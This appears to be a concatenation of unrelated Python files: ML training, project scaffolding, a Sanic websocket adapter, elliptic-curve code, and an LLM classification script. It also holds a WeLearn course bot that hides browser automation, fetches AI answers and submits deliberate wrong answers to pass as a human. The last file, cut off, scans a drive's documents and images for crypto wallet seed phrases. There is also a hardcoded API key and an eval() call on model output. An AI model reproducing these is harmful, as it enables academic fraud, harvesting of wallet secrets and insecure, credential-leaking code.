help='Resume quality disc from this checkpoint', default=None, type=str)\n\nargs = parser.parse_args()\n\n\nglobal_step = 0\nglobal_epoch = 0\nuse_cuda = torch.cuda.is_available()\nprint('use_cuda: {}'.format(use_cuda))\n\nsyncnet_T = 5\nsyncnet_mel_step_size = 16\n\nLAMBDA = 10  # gradient penalty\n\n\ndef wasserstein_loss(y_pred, y_true):\n    return torch.mean(y_true * y_pred)\n\nclass Dataset(object):\n    def __init__(self, split):\n        self.all_videos = get_image_list(args.data_root, split)\n\n    def get_frame_id(self, frame):\n        return int(basename(frame).split('.')[0])\n\n    def get_window(self, start_frame):\n        start_id = self.get_frame_id(start_frame)\n        vidname = dirname(start_frame)\n\n        window_fnames = []\n        for frame_id in range(start_id, start_id + syncnet_T):\n            frame = join(vidname, '{}.jpg'.format(frame_id))\n            if not isfile(frame):\n                return None\n            window_fnames.append(frame)\n        return window_fnames\n\n    def read_window(self, window_fnames):\n        if window_fnames is None: return None\n        window = []\n        for fname in window_fnames:\n            img = cv2.imread(fname)\n            if img is None:\n                return None\n            try:\n                img = cv2.resize(img, (hparams.img_size, hparams.img_size))\n            except Exception as e:\n                return None\n\n            window.append(img)\n\n        return window\n\n    def crop_audio_window(self, spec, start_frame):\n        if type(start_frame) == int:\n            start_frame_num = start_frame\n        else:\n            start_frame_num = self.get_frame_id(start_frame)\n        start_idx = int(80. * (start_frame_num / float(hparams.fps)))\n        \n        end_idx = start_idx + syncnet_mel_step_size\n\n        return spec[start_idx : end_idx, :]\n\n    def get_segmented_mels(self, spec, start_frame):\n        mels = []\n        assert syncnet_T == 5\n        start_frame_num = self.get_frame_id(start_frame) + 1 # 0-indexing ---> 1-indexing\n        if start_frame_num - 2 < 0: return None\n        for i in range(start_frame_num, start_frame_num + syncnet_T):\n            m = self.crop_audio_window(spec, i - 2)\n            if m.shape[0] != syncnet_mel_step_size:\n                return None\n            mels.append(m.T)\n\n        mels = np.asarray(mels)\n\n        return mels\n\n    def prepare_window(self, window):\n        # 3 x T x H x W\n        x = np.asarray(window) / 255.\n        x = np.transpose(x, (3, 0, 1, 2))\n\n        return x\n\n    def __len__(self):\n        return len(self.all_videos)\n\n    def __getitem__(self, idx):\n        while 1:\n            idx = random.randint(0, len(self.all_videos) - 1)\n            vidname = self.all_videos[idx]\n            img_names = list(glob(join(vidname, '*.jpg')))\n            if len(img_names) <= 3 * syncnet_T:\n                continue\n            \n            img_name = random.choice(img_names)\n            wrong_img_name = random.choice(img_names)\n            while wrong_img_name == img_name:\n                wrong_img_name = random.choice(img_names)\n\n            window_fnames = self.get_window(img_name)\n            wrong_window_fnames = self.get_window(wrong_img_name)\n            if window_fnames is None or wrong_window_fnames is None:\n                continue\n\n            window = self.read_window(window_fnames)\n            if window is None:\n                continue\n\n            wrong_window = self.read_window(wrong_window_fnames)\n            if wrong_window is None:\n                continue\n\n            try:\n                wavpath = join(vidname, \"audio.wav\")\n                wav = audio.load_wav(wavpath, hparams.sample_rate)\n\n                orig_mel = audio.melspectrogram(wav).T\n            except Exception as e:\n                continue\n\n            mel = self.crop",
    "# Created by Kian Solati\r\n\r\nimport os\r\nimport subprocess\r\n\r\ntry:\r\n    project_name = input(\"Enter the name of the project folder: \").strip()\r\n    if not project_name:\r\n        raise ValueError(\"Project name cannot be empty.\")\r\n    \r\n    print(f\"Creating Vite project in folder: {project_name}...\")\r\n    subprocess.run(\r\n        f\"npm create vite@latest {project_name} --template vanilla\",\r\n        check=True, shell=True\r\n    )\r\n    \r\n    os.chdir(project_name)\r\n\r\n    print(\"Removing unnecessary files...\")\r\n    unnecessary_files = [\r\n        \"public/vite.svg\",\r\n        \"src/javascript.svg\",\r\n        \"src/counter.js\",\r\n        \"src/style.css\"\r\n    ]\r\n    for file in unnecessary_files:\r\n        if os.path.exists(file):\r\n            os.remove(file)\r\n\r\n    print(\"Clearing content of main.js...\")\r\n    main_js_path = \"src/main.js\"\r\n    if os.path.exists(main_js_path):\r\n        with open(main_js_path, \"w\", encoding=\"utf-8\") as main_js_file:\r\n            main_js_file.write(\"\")\r\n\r\n    print(\"Installing dependencies...\")\r\n    subprocess.run(\"npm install\", check=True, shell=True)\r\n\r\n    print(\"Installing Tailwind CSS...\")\r\n    subprocess.run(\"npm install -D tailwindcss postcss autoprefixer\", check=True, shell=True)\r\n\r\n    print(\"Initializing Tailwind CSS...\")\r\n    subprocess.run(\"npx tailwindcss init\", check=True, shell=True)\r\n\r\n    print(\"Creating PostCSS configuration...\")\r\n    with open(\"postcss.config.js\", \"w\", encoding=\"utf-8\") as postcss_file:\r\n        postcss_file.write(\r\n            \"\"\"export default {\r\n  plugins: {\r\n    tailwindcss: {},\r\n    autoprefixer: {},\r\n  },\r\n};\"\"\"\r\n        )\r\n\r\n    print(\"Configuring Tailwind CSS...\")\r\n    with open(\"tailwind.config.js\", \"r+\", encoding=\"utf-8\") as config_file:\r\n        content = config_file.read()\r\n        config_file.seek(0)\r\n        config_file.write(\r\n            content.replace(\r\n                \"content: []\",\r\n                \"content: ['./index.html', './src/**/*.{js,ts,jsx,tsx}']\",\r\n            )\r\n        )\r\n\r\n    print(\"Creating files and directories...\")\r\n    os.makedirs(\"src\", exist_ok=True)\r\n    with open(\"src/tailwind.css\", \"w\", encoding=\"utf-8\") as css_file:\r\n        css_file.write(\r\n            \"\"\"@tailwind base;\\n@tailwind components;\\n@tailwind utilities;\"\"\"\r\n        )\r\n\r\n    print(\"Updating index.html...\")\r\n    with open(\"index.html\", \"w\", encoding=\"utf-8\") as index_file:\r\n        index_file.write(\r\n            \"\"\"<!doctype html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n  <meta charset=\"UTF-8\" />\r\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n  <title>By KianSolati, Enjoy</title>\r\n  <link href=\"src/tailwind.css\" rel=\"stylesheet\">\r\n</head>\r\n\r\n<body class=\"bg-gray-100 flex justify-center items-center min-h-screen\">\r\n  <div class=\"bg-white p-6 shadow-lg rounded-md flex flex-col justify-center items-center\">\r\n    <h1 class=\"text-orange-400 text-3xl font-bold mb-2\">Hello Guys!</h1>\r\n    <h3 class=\"text-gray-600 font-medium mb-3\">Created by Kian Solati, Enjoy</h3>\r\n    <a href=\"https://github.com/kiansolati56\" target=\"_blank\"\r\n      class=\"text-white bg-[#24292F] transition-all duration-300 focus:outline-none font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center hover:bg-[#050708]/70 me-2 mb-2\">\r\n      <svg class=\"w-4 h-4 me-2\" aria-hidden=\"true\" xmlns=\"http://www.w3.org/2000/svg\" fill=\"currentColor\"\r\n        viewBox=\"0 0 20 20\">\r\n        <path fill-rule=\"evenodd\"\r\n          d=\"M10 .333A9.911 9.911 0 0 0 6.866 19.65c.5.092.678-.215.678-.477 0-.237-.01-1.017-.014-1.845-2.757.6-3.338-1.169-3.338-1.169a2.627 2.627 0 0 0-1.1-1.451c-.9-.615.07-.6.07-.6a2.084 2.084 0 0 1 1.518 1.021 2.11 2.11 0 0 0 2.884.823c.044-.503.268-.973.63-1.325-2.2-.25-4.516-1.1-4.516-4.9A3.832 3.832 0 0 1 4.7 7.068a3.56 3.56 0 0 1 .095-2.623s.832-.266 2.726 1.016a9.409 9.409 0 0 1 4.962 0c1.89-1.282 2.717-1.016 2.717-1.016.366.83.402 1.768.1 2.623a3.827 3.827 0 0 1 1.02 2.659c0 3.807-2.319 4.644-4.525 4.889a2.366 2.366 0 0 1 .673 1.834c0 1.326-.012 2.394-.012 2.72 0 .263.18.572.681.475A9.911 9.911 0 0 0 10 .333Z\"\r\n          clip-rule=\"evenodd\" />\r\n      </svg>\r\n      My Github\r\n    </a>\r\n  </div>\r\n</body>\r\n\r\n</html>\"\"\"\r\n        )\r\n\r\n    print(\"\\nSuccessfully set up the project. Run the project with ...npm run dev...\")\r\nexcept ValueError as ve:\r\n    print(f\"Input error: {ve}\")\r\nexcept subprocess.CalledProcessError as e:\r\n    print(f\"Error while running a command: {e}\")\r\nexcept Exception as e:\r\n    print(f\"An unexpected error occurred: {e}\")\r\n",
    "import sys\nfrom urllib.parse import urlsplit\n\ntry:  # pragma: no cover\n    from sanic.response import HTTPResponse\n    try:\n        from sanic.server.protocols.websocket_protocol import WebSocketProtocol\n    except ImportError:\n        from sanic.websocket import WebSocketProtocol\nexcept ImportError:\n    HTTPResponse = None\n    WebSocketProtocol = None\n\n\ndef create_route(app, engineio_server, engineio_endpoint):  # pragma: no cover\n    \"\"\"This function sets up the engine.io endpoint as a route for the\n    application.\n\n    Note that both GET and POST requests must be hooked up on the engine.io\n    endpoint.\n    \"\"\"\n    app.add_route(engineio_server.handle_request, engineio_endpoint,\n                  methods=['GET', 'POST', 'OPTIONS'])\n    try:\n        app.enable_websocket()\n    except AttributeError:\n        # ignore, this version does not support websocket\n        pass\n\n\ndef translate_request(request):  # pragma: no cover\n    \"\"\"This function takes the arguments passed to the request handler and\n    uses them to generate a WSGI compatible environ dictionary.\n    \"\"\"\n    class AwaitablePayload:\n        def __init__(self, payload):\n            self.payload = payload or b''\n\n        async def read(self, length=None):\n            if length is None:\n                r = self.payload\n                self.payload = b''\n            else:\n                r = self.payload[:length]\n                self.payload = self.payload[length:]\n            return r\n\n    uri_parts = urlsplit(request.url)\n    environ = {\n        'wsgi.input': AwaitablePayload(request.body),\n        'wsgi.errors': sys.stderr,\n        'wsgi.version': (1, 0),\n        'wsgi.async': True,\n        'wsgi.multithread': False,\n        'wsgi.multiprocess': False,\n        'wsgi.run_once': False,\n        'SERVER_SOFTWARE': 'sanic',\n        'REQUEST_METHOD': request.method,\n        'QUERY_STRING': uri_parts.query or '',\n        'RAW_URI': request.url,\n        'SERVER_PROTOCOL': 'HTTP/' + request.version,\n        'REMOTE_ADDR': '127.0.0.1',\n        'REMOTE_PORT': '0',\n        'SERVER_NAME': 'sanic',\n        'SERVER_PORT': '0',\n        'sanic.request': request\n    }\n\n    for hdr_name, hdr_value in request.headers.items():\n        hdr_name = hdr_name.upper()\n        if hdr_name == 'CONTENT-TYPE':\n            environ['CONTENT_TYPE'] = hdr_value\n            continue\n        elif hdr_name == 'CONTENT-LENGTH':\n            environ['CONTENT_LENGTH'] = hdr_value\n            continue\n\n        key = 'HTTP_%s' % hdr_name.replace('-', '_')\n        if key in environ:\n            hdr_value = f'{environ[key]},{hdr_value}'\n\n        environ[key] = hdr_value\n\n    environ['wsgi.url_scheme'] = environ.get('HTTP_X_FORWARDED_PROTO', 'http')\n\n    path_info = uri_parts.path\n\n    environ['PATH_INFO'] = path_info\n    environ['SCRIPT_NAME'] = ''\n\n    return environ\n\n\ndef make_response(status, headers, payload, environ):  # pragma: no cover\n    \"\"\"This function generates an appropriate response object for this async\n    mode.\n    \"\"\"\n    headers_dict = {}\n    content_type = None\n    for h in headers:\n        if h[0].lower() == 'content-type':\n            content_type = h[1]\n        else:\n            headers_dict[h[0]] = h[1]\n    return HTTPResponse(body=payload, content_type=content_type,\n                        status=int(status.split()[0]), headers=headers_dict)\n\n\nclass WebSocket:  # pragma: no cover\n    \"\"\"\n    This wrapper class provides a sanic WebSocket interface that is\n    somewhat compatible with eventlet's implementation.\n    \"\"\"\n    def __init__(self, handler, server):\n        self.handler = handler\n        self.server = server\n        self._sock = None\n\n    async def __call__(self, environ):\n        request = environ['sanic.request']\n        protocol = request.transport.get_protocol()\n        self._sock = await protocol.websocket_handshake(request)\n\n        self.environ = environ\n        await self.handler(self)\n        return self.server._ok()\n\n    async def close(self):\n        await self._sock.close()\n\n    async def send(self, message):\n        await self._sock.send(message)\n\n    async def wait(self):\n        data = await self._sock.recv()\n        if not isinstance(data, bytes) and \\\n                not isinstance(data, str):\n            raise OSError()\n        return data\n\n\n_async = {\n    'asyncio': True,\n    'create_route': create_route,\n    'translate_request': translate_request,\n    'make_response': make_response,\n    'websocket': WebSocket if WebSocketProtocol else None,\n}\n",
    "import datetime\nimport math\nimport random\nimport time\nimport re\nfrom concurrent.futures import ThreadPoolExecutor\nimport threading\nimport html2text\nfrom openai import OpenAI\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\nimport tkinter as tk\nfrom tkinter import messagebox, scrolledtext\nimport ttkbootstrap as ttk\n\n# \u521d\u59cb\u65f6\u95f4\nt1 = time.time()\n\n# \u6700\u540e\u65f6\u95f4\nt2 = 0\n\n# \u5168\u5c40\u53d8\u91cf\u7528\u4e8e\u5b58\u50a8\u65e5\u5fd7\u6846\nlog_window = None\nlog_text = None\n\n# \u5168\u5c40\u53d8\u91cf\u7528\u4e8e\u5b58\u50a8\u5237\u8bfe\u6a21\u5f0f\nmulti_thread_mode = False  # \u9ed8\u8ba4\u4f7f\u7528\u666e\u901a\u6a21\u5f0f\n\n\ndef print_color(text, color=\"white\", style=None, isDash=None):\n    \"\"\"\n    \u5728 Tkinter \u7684 Text \u7ec4\u4ef6\u4e2d\u6253\u5370\u5e26\u989c\u8272\u7684\u6587\u672c\n\n    :param text: \u8981\u6253\u5370\u7684\u6587\u672c\n    :param color: \u6587\u672c\u989c\u8272\uff08\u53ef\u9009\uff1ared, green, blue, yellow, white\uff09\n    :param style: \u6587\u672c\u6837\u5f0f\uff08\u53ef\u9009\uff1abold\uff09\n    \"\"\"\n    if not log_text:\n        return  # \u5982\u679c\u65e5\u5fd7\u6846\u672a\u521d\u59cb\u5316\uff0c\u76f4\u63a5\u8fd4\u56de\n\n    # \u6784\u5efa\u6807\u7b7e\n    tags = []\n    if color:\n        tags.append(color)\n    if style:\n        tags.append(style)\n    if isDash:\n        text += \"\\n-------------------------------------------------------------------------------------------------\"\n\n    # \u63d2\u5165\u5e26\u989c\u8272\u7684\u6587\u672c\n    log_text.configure(state=\"normal\")\n    log_text.insert(\"end\", text + \"\\n\", tuple(tags))\n    log_text.configure(state=\"disabled\")\n    log_text.see(\"end\")  # \u81ea\u52a8\u6eda\u52a8\u5230\u5e95\u90e8\n\n\ndef initialize_webdriver():\n    options = webdriver.ChromeOptions()\n    # options.add_argument(\"--headless\")  # \u542f\u7528\u65e0\u5934\u6a21\u5f0f\n    options.add_argument(\"--disable-css\")  # \u7981\u7528css\n    options.add_argument(\"--disable-images\")  # \u56fe\u7247\u4e0d\u52a0\u8f7d\n    options.add_argument(\"--disable-blink-features=AutomationControlled\")\n    options.add_experimental_option(\"excludeSwitches\", [\"enable-automation\"])\n    options.add_experimental_option(\"useAutomationExtension\", False)\n\n    driver = webdriver.Chrome(service=Service(\"./chromedriver_win32/chromedriver.exe\"), options=options)\n    driver.execute_cdp_cmd(\"Page.addScriptToEvaluateOnNewDocument\", {\n        \"source\": \"\"\"\n        Object.defineProperty(navigator, 'webdriver', {\n            get: () => undefined\n        })\n        \"\"\"\n    })\n    return driver\n\n\ndef clean_solution(solution):\n    solution = re.sub(r'\\s{2,}', ' ', solution)\n    solution = re.sub(r'<[^>]*>', '', solution)\n    solution = solution.replace(\"\\n\", \" \").replace(\"\\r\", \" \")\n    return solution.strip()\n\n\ndef DeepSeekAsk(prompt, temperature):\n    \"\"\"\n    \u4f7f\u7528DeepSeek\u7684API\u8fdb\u884cAI\u95ee\u7b54\n\n    :param prompt:GPT\u4e13\u95e8\u95ee\u7b54\u8bed\u53e5\n    :param temperature: \u67d0\u79cd\u7c7b\u578b\u7684\u53c2\u6570\n    :return: AI\u56de\u7b54\u7684\u7b54\u6848\n    \"\"\"\n    api_key = \"sk-ecee03845a1b42938fb66bae42694268\"\n    client = OpenAI(api_key=api_key, base_url=\"https://api.deepseek.com\")\n    response = client.chat.completions.create(\n        model=\"deepseek-chat\",\n        messages=[\n            {\"role\": \"user\", \"content\": prompt},\n        ],\n        temperature=temperature,\n        stream=False\n    )\n    print_color(response.choices[0].message.content, color=\"blue\", style=\"bold\", isDash=True)\n    return response.choices[0].message.content\n\n\ndef login(driver, username, password):\n    \"\"\"\n    \u8fdb\u884c\u767b\u5f55\u903b\u8f91\n    :param driver:\u6d4f\u89c8\u5668\u9a71\u52a8\n    :param username:\u7528\u6237\u540d/\u624b\u673a\u53f7\n    :param password:\u5bc6\u7801\n    \"\"\"\n\n    # \u8fdb\u5165Welearn\u7684\u767b\u5f55\u4e3b\u9875\n    driver.get(\"https://sso.sflep.com/idsvr/login.html\")\n\n    # \u7b49\u5f85\u8be5\u5143\u7d20\u66b4\u9732\u518d\u8fdb\u884c\u4e0b\u9762\u64cd\u4f5c\uff0c\u5176\u4ed6\u5730\u65b9\u7684\u7528\u6cd5\u4e5f\u662f\u4e00\u4e2a\u9053\u7406\n    WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, \"username\")))\n\n    # \u7528\u6237\u540d/\u624b\u673a\u53f7\n    username_field = driver.find_element(By.ID, \"username\")\n    # \u624b\u673a\u53f7\n    password_field = driver.find_element(By.ID, \"password\")\n\n    # \u8f93\u5165\u7528\u6237\u540d/\u624b\u673a\u53f7\uff0c\u5bc6\u7801\n    username_field.send_keys(username)\n    password_field.send_keys(password)\n\n    # \u70b9\u51fb\u767b\u5f55\u6309\u94ae\n    driver.find_element(By.ID, \"login\").click()\n    WebDriverWait(driver, 15).until(EC.url_changes(\"https://sso.sflep.com/idsvr/login.html\"))\n\n\ndef handle_choice_questions(driver, timee, correct_rate):\n    \"\"\"\n    \u5237\u9898: \u9009\u62e9\u9898\n\n    :param driver:\u6d4f\u89c8\u5668\u9a71\u52a8\n    :param time: \u9009\u9879\u4e4b\u95f4\u7b49\u5f85\u65f6\u95f4\n    :param correct_rate: \u6b63\u786e\u7387\n    :return:\n    \"\"\"\n    # \u83b7\u53d6\u9009\u62e9\u9898\u7684\u6807\u5fd7\u5143\u7d20\n    choice_elements = driver.find_elements(By.CSS_SELECTOR, \"div[data-controltype='choice']\")\n\n    if choice_elements:\n        total_elements_num = len(choice_elements)\n        wrong_choice_num = math.floor(total_elements_num * (1 - correct_rate))\n\n        # \u9700\u8981\u8bbe\u5b9a\u7684\u9519\u8bef\u7684\u9898\u76ee\u7f16\u53f7\n        wrong_choice_list = random.sample([i for i in range(1, total_elements_num + 1)], wrong_choice_num)\n        index = 1\n\n        # \u83b7\u53d6\u9898\u76ee\u7684\u9009\u9879\u5927\u5217\u8868\n        ul_elements = driver.find_elements(By.CSS_SELECTOR, \"ul[data-itemtype='options']\")\n        for ul in ul_elements:\n            options_li = ul.find_elements(By.TAG_NAME, \"li\")\n            # \u83b7\u53d6\u6bcf\u4e00\u4e2a\u9898\u76ee\u7684\u5c0fli\n            for option in options_li:\n                solution = option.get_attribute(\"data-solution\")\n                # \u9898\u76ee\u662f\u5426\u9700\u8981\u9009\u62e9\u9519\u8bef\u7b54\u6848\n                if index in wrong_choice_list:\n                    # \u4ee3\u8868\u5f53\u524d\u9009\u9879\u662f\u9519\u8bef\u7b54\u6848\n                    if solution is None:\n                        driver.execute_script(\"arguments[0].click();\", option)\n                        time.sleep(0.3)\n                        print_color(f",
    "import hashlib\nimport random\n\nclass EllipticCurveBase:\n    def __init__(self, a, b, n):\n        \"\"\"Base class for elliptic curves.\"\"\"\n        self.a = a\n        self.b = b\n        self.n = n\n\n    def find_next_point(self, x):\n        for i in range (x,x+0x1000):\n            y = self.solve_y(i)\n            if len(y) > 0:\n                newP= (i,y[0])\n                if self.is_on_curve(newP) is True:\n                    return newP\n        return None\n\n    def pollards_rho(self, P, Q, max_steps=10000000, num_subsets=64):\n        \"\"\"\n        Solve for k in Q = kP using Pollard's Rho algorithm.\n        Returns k if found, or None if not found within max_steps.\n        \"\"\"\n        if self.n is None:\n            raise ValueError(\"Curve order n must be specified for Pollard's Rho.\")\n\n        # Adjust for cofactor\n        if hasattr(self, 'cofactor') and self.cofactor > 1:\n            P = self.scalar_mult(self.cofactor, P)\n            Q = self.scalar_mult(self.cofactor, Q)\n\n        def partition(P, num_subsets):\n            if P is None:\n                return 0\n            x = P[0]\n            x_int = int(x)\n            return x_int % num_subsets\n\n        # Initialize variables\n        X = P\n        a = 1\n        b = 0\n\n        Y = P\n        A = 1\n        B = 0\n\n        for i in range(1, max_steps + 1):\n            X, a, b = self._pollards_rho_step(X, a, b, P, Q, partition, num_subsets)\n            Y, A, B = self._pollards_rho_step(Y, A, B, P, Q, partition, num_subsets)\n            Y, A, B = self._pollards_rho_step(Y, A, B, P, Q, partition, num_subsets)\n\n            if X == Y:\n                r = (a - A) % self.n\n                s = (B - b) % self.n\n                if s == 0:\n                    # Retry with different parameters\n                    return None\n                try:\n                    s_inv = pow(s, -1, self.n)\n                    k = (r * s_inv) % self.n\n                    # Verify the solution\n                    if self.scalar_mult(k, P) == Q:\n                        return k\n                    else:\n                        return None\n                except ValueError:\n                    return None\n        return None\n\n    def _pollards_rho_step(self, P, a, b, P0, Q, partition, num_subsets):\n        if P is None:\n            return P, a, b\n\n        subset = partition(P, num_subsets)\n        if subset < num_subsets // 3:\n            # P = P + Q\n            P_new = self.point_add(P, Q)\n            a_new = a\n            b_new = (b + 1) % self.n\n        elif subset < 2 * num_subsets // 3:\n            # P = 2P\n            P_new = self.point_double(P)\n            a_new = (2 * a) % self.n\n            b_new = (2 * b) % self.n\n        else:\n            # P = P + P0\n            P_new = self.point_add(P, P0)\n            a_new = (a + 1) % self.n\n            b_new = b\n        return P_new, a_new, b_new\n\n    # Common methods that can be shared or overridden by subclasses\n    def is_on_curve(self, P):\n        raise NotImplementedError(\"Must be implemented by subclass.\")\n\n    def point_add(self, P, Q):\n        raise NotImplementedError(\"Must be implemented by subclass.\")\n\n    def point_double(self, P):\n        raise NotImplementedError(\"Must be implemented by subclass.\")\n\n    def scalar_mult(self, k, P):\n        \"\"\"Multiply a point P by an integer k modulo n using the double-and-add algorithm.\"\"\"\n        if P is None:\n            return None\n        if self.n:\n            k = k % self.n  # Reduce k modulo n\n            if k == 0:\n                return None  # Return point at infinity\n\n        result = None  # Point at infinity\n        addend = P\n\n        while k > 0:\n            if k & 1:\n                result = self.point_add(result, addend)\n            addend = self.point_double(addend)\n            k >>= 1\n\n        return result\n\n    def solve_y(self, x):\n        raise NotImplementedError(\"Must be implemented by subclass.\")\n\n    def _mess_to_bytes(self, message):\n        if isinstance(message, str):\n            data_bytes = message.encode('utf-8')\n        elif isinstance(message, int):\n            hex_string = hex(message)[2:]\n            if len(hex_string) % 2 != 0:  # Check if the length is odd\n                hex_string = '0' + hex_string\n            data_bytes = bytes.fromhex(hex_string)\n        elif isinstance(message, bytes):\n            data_bytes = message\n        else:\n            raise TypeError(\"Input must be of type int, str, or bytes.\")\n\n        return data_bytes\n\n    def _gen_nonce(self, message, d):\n        nonce_hash = hashlib.new('sha256')\n        nonce_hash.update(self._mess_to_bytes(random.randrange(2,self.n-1)))\n        nonce_hash.update(self._mess_to_bytes(message))\n        nonce_hash.update(self._mess_to_bytes(d))\n        return int.from_bytes(nonce_hash.digest(),\"little\", signed=False)  % self.n\n\n    def _hash_message(self,message):\n\n        mess_hash = hashlib.new('sha256')\n        mess_hash.update(self._mess_to_bytes(message))\n        return int.from_bytes(mess_hash.digest(),",
    "import random\r\nfrom openai import OpenAI\r\nimport httpx\r\nimport os\r\nimport json\r\nimport argparse\r\nfrom tqdm import tqdm\r\nimport time\r\n\r\ndef ini_client():\r\n    client = OpenAI()\r\n    return client\r\n\r\ndef chat(prompt, client):\r\n    completion = client.chat.completions.create(\r\n        model=\"gpt-3.5-turbo-0125\",\r\n        response_format={ \"type\": \"json_object\" },\r\n        messages=[\r\n        {\"role\": \"system\", \"content\": \"You are a helpful assistant designed to output JSON.\"},\r\n        {\"role\": \"user\", \"content\": prompt}\r\n        ]\r\n    )\r\n    response_origin = completion.choices[0].message.content\r\n    # print(f\"Original response: {response_origin}\")\r\n    return response_origin\r\n\r\ndef load_dataset(data_path, data, use_large):\r\n    # data_file_list = os.listdir(data_path) # ['large.jsonl', 'small.jsonl']\r\n    # print(data_file_list)\r\n    data_file = os.path.join(data_path, data, \"large.jsonl\") if use_large else os.path.join(data_path, data, \"small.jsonl\")\r\n    print(f\"Use dataset {data_file}\")\r\n    with open(data_file,'r') as f:\r\n        data_list = []\r\n        for line in f:\r\n            json_object = json.loads(line)\r\n            data_list.append(json_object)\r\n    print(f\"Length of dataset: {len(data_list)}\")\r\n    return data_list\r\n\r\ndef get_label_list(data_list):\r\n    label_list = []\r\n    for data in data_list:\r\n        if data[\"label\"] not in label_list:\r\n            label_list.append(data[\"label\"])\r\n    return label_list\r\n\r\ndef get_predict_labels(output_path, data):\r\n    data_file = os.path.join(output_path, data + \"_small_llm_generated_labels_after_merge.json\")\r\n    \r\n    with open(data_file, 'r') as f:\r\n        data_list = json.load(f)\r\n    data_list = list(set(data_list))\r\n    return data_list\r\n\r\ndef prompt_construct(label_list, sentence):\r\n    prompt = f\"Given the label list and the sentence, please categorize the sentence into one of the labels.\\n\"\r\n    prompt += f\"Label list: {label_list}.\\n\"\r\n    prompt += f\"Sentence:{sentence}.\\n\"\r\n    json_example = {\"label_name\": \"label\"}\r\n    prompt += f\"You should only return the label name, please return in json format like: {json_example}\"\r\n    return prompt\r\n\r\ndef answer_process(response,label_list):\r\n    label = \"Unsuccessful\"\r\n    try:\r\n        response_new = eval(response)\r\n    except:\r\n        response_new = str(response)\r\n    if isinstance(response_new, dict):\r\n        total_label = []\r\n        for key, value in response_new.items():\r\n            total_label.append(value)\r\n        for i in label_list:\r\n            if i in total_label:\r\n                label = i\r\n                return label\r\n    else:\r\n        for i in label_list:\r\n            if i in response_new:\r\n                label = i\r\n                return label\r\n    return label\r\n\r\ndef known_label_categorize(args, client, data_list, label_list):\r\n    answer = dict()\r\n    length = args.test_num if args.print_details else len(data_list)\r\n    answer[\"Unsuccessful\"] = []\r\n    for label in label_list:\r\n        answer[label] = []\r\n    for i in range(length):\r\n        sentence = data_list[i]['input']\r\n        prompt = prompt_construct(label_list, sentence)\r\n        response = chat(prompt, client)\r\n        if response is None:\r\n            response_adjusted = \"Unsuccessful\"\r\n        else:\r\n            response_adjusted = answer_process(response, label_list)\r\n        \r\n        if response_adjusted in label_list:\r\n            answer[response_adjusted].append(sentence)\r\n        else:\r\n            answer[\"Unsuccessful\"].append(sentence)\r\n        \r\n        if args.print_details:\r\n            print(f\"---------------Sample {i + 1}-------------------\")\r\n            print(f\"Question: {sentence}\")\r\n            print(f\"prompt:\\n{prompt}\")\r\n            print(f\"Original Answer: {response}\")\r\n            print(f\"Final Answer: {response_adjusted}\")\r\n            print(answer)\r\n        if i % 200 == 0:\r\n            print(f\"Total sample number: {i}\", end = \"\\t\")\r\n            write_answer_to_json(args, answer, args.output_path, args.output_file_name)\r\n    return answer\r\n\r\ndef write_answer_to_json(args, answer, output_path, output_name):\r\n    size = \"large\" if args.use_large else \"small\"\r\n    file_name = os.path.join(output_path, '_'.join([args.data, size, output_name]))\r\n    with open(file_name, 'w') as json_file:\r\n        json.dump(answer, json_file, indent=2)\r\n    print(f\"JSON file '{file_name}' written.\")\r\n\r\ndef load_predict_data(data_path, file_name):\r\n    data_file = os.path.join(data_path, file_name)\r\n    with open(data_file,'r') as f:\r\n        data_dict = json.load(f)\r\n    return data_dict\r\n\r\ndef describe_final_output(answer):\r\n    for key in answer.keys():\r\n        print(f\"{key}: {len(answer[key])}\")\r\n\r\ndef main(args): # given label classification\r\n    print(args.use_large)\r\n    start_time = time.time()\r\n    client = ini_client(args.api_key)\r\n    data_list = load_dataset(args.data_path, args.data, args.use_large)\r\n    label_list = get_predict_labels(args.output_path, args.data)\r\n    print(f\"Length of label list",
    "#!/usr/bin/env python3\n\nimport datetime\nimport os, os.path as op\nimport re\nimport sqlite3\nimport sys\nimport argparse\nimport multiprocessing as mp\nfrom mnemonic import Mnemonic\n\nfrom gen_wallet import *\n\nimport fitz\nimport docx\nfrom docx.document import Document\nfrom docx.oxml.table import CT_Tbl\nfrom docx.oxml.text.paragraph import CT_P\nfrom docx.table import _Cell, Table\nfrom docx.text.paragraph import Paragraph\nimport itertools\n\nimport cv2\n\nif sys.platform == 'win32':\n    import win32com.client\n\nimport openpyxl\n\nPARCE_ETH=True\nLOG_DIR='./logs/'\nBASE_DIR = op.abspath(op.dirname(__file__))\nSOURCE_DIR = 'D:/'#op.join(BASE_DIR, '/home/user/FILES/')\n\nGOOD_EXTENSIONS = {\n    '.jpg',\n    '.png',\n    '.jpeg',\n    '.doc',\n    '.docx',\n    '.pdf',\n    '.xls',\n    '.xlsx'\n}\n\nPIC_EXT=[\n    '.jpg',\n    '.png',\n    '.jpeg'\n]\n\nEXCEL_EXT=['.xls','.xlsx']\n\nWORD_EXT=['.doc','.docx']\n\n\nBAD_DIRS=[\n    'ololololz'\n]\nBAD_FILES=[\n    'ololololo'\n]\n\nENABLE_LANG=[\n    'english',\n    'chinese_simplified',\n    'chinese_traditional',\n    'french',\n    'italian',\n    'japanese',\n    'korean',\n    'portuguese',\n    'spanish'\n]\nWORDS_CHAIN_SIZES = {12, 15, 18, 24}\nEXWORDS=2\n\nCREATE_TABLES_SQL = \"\"\"\nDROP TABLE [temp];\nCREATE TABLE [temp](\n  [phrase] VARCHAR(500),\n  PRIMARY KEY([phrase]));\n\"\"\"\n\n\nclass DBController:\n    def __init__(self,in_memory=True):\n        #self.conn=sqlite3.connect(\"file::memory:?cache=shared\", uri=True,detect_types=sqlite3.PARSE_DECLTYPES)\n        self.conn=sqlite3.connect('tmp.db',detect_types=sqlite3.PARSE_DECLTYPES)\n\n    def insert_phrase(self,phrase):\n        cur=self.conn.cursor()\n        try:\n            cur.execute('insert into temp values (?)',(phrase,))\n            self.conn.commit()\n        except:\n            self.conn.rollback()\n            raise\n\n    def pharse_in_db(self,phrase):\n        